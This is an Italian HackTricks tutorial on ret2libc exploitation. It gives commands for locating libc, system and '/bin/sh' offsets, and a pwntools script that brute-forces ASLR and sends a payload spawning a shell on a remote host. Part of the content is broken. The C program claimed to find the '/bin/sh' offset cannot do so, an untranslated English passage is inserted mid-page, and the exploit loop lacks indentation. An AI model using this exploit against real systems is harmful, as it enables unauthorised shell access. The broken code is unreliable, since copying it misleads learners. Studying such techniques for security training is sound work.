<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


**Se hai trovato un binario vulnerabile e pensi di poterlo sfruttare usando Ret2Lib, qui troverai alcuni passaggi di base che puoi seguire.**

# Se sei **all'interno** dell'**host**

## Puoi trovare l'**indirizzo di lib**c
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
Se vuoi verificare se l'ASLR sta cambiando l'indirizzo di libc, puoi fare quanto segue:
```bash
for i in `seq 0 20`; do ldd <Ejecutable> | grep libc; done
```
## Ottenere l'offset della funzione system

To exploit a binary using a return-to-libc attack, we need to know the offset of the `system` function in the target system's libc library. This offset will help us calculate the address of the `system` function in memory.

To find the offset, we can use the `nm` command to list the symbols in the libc library and search for the `system` function. The offset is the hexadecimal value listed before the symbol name.

Here's an example command to find the offset of the `system` function:

```bash
nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep " system$"
```

This command will search for the symbol name "system" in the libc library and display the corresponding offset. Once we have the offset, we can calculate the address of the `system` function by adding it to the base address of the libc library in memory.

Keep in mind that the libc library and its symbols may vary depending on the target system. So, it's important to use the correct libc library for the target system when calculating the offset.
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
## Ottenere l'offset di "/bin/sh"

Per ottenere l'offset di "/bin/sh", possiamo utilizzare il seguente codice in C:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    char *ptr = getenv("PATH");
    int offset = 0;

    while (ptr != NULL) {
        if (strcmp(ptr, "/bin/sh") == 0) {
            printf("Offset: %d\n", offset);
            break;
        }
        offset++;
        ptr = getenv(NULL);
    }

    return 0;
}
```

Compilare ed eseguire il codice C sopra riportato restituir√† l'offset di "/bin/sh".
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
## /proc/\<PID>/maps

Se il processo crea **figli** ogni volta che si comunica con esso (server di rete), prova a **leggere** quel file (probabilmente avrai bisogno di essere root).

Qui puoi trovare **esattamente dove √® caricata la libc** all'interno del processo e **dove sar√† caricata** per ogni figlio del processo.

![](<../../.gitbook/assets/image (95).png>)

In questo caso √® caricata in **0xb75dc000** (questo sar√† l'indirizzo di base della libc)

## Usando gdb-peda

Ottieni l'indirizzo della funzione **system**, della funzione **exit** e della stringa **"/bin/sh"** utilizzando gdb-peda:
```
p system
p exit
find "/bin/sh"
```
# Bypassare ASLR

Puoi provare a forzare l'indirizzo base di libc.
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
# Codice
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()    #Banner

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive() #?
```
<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
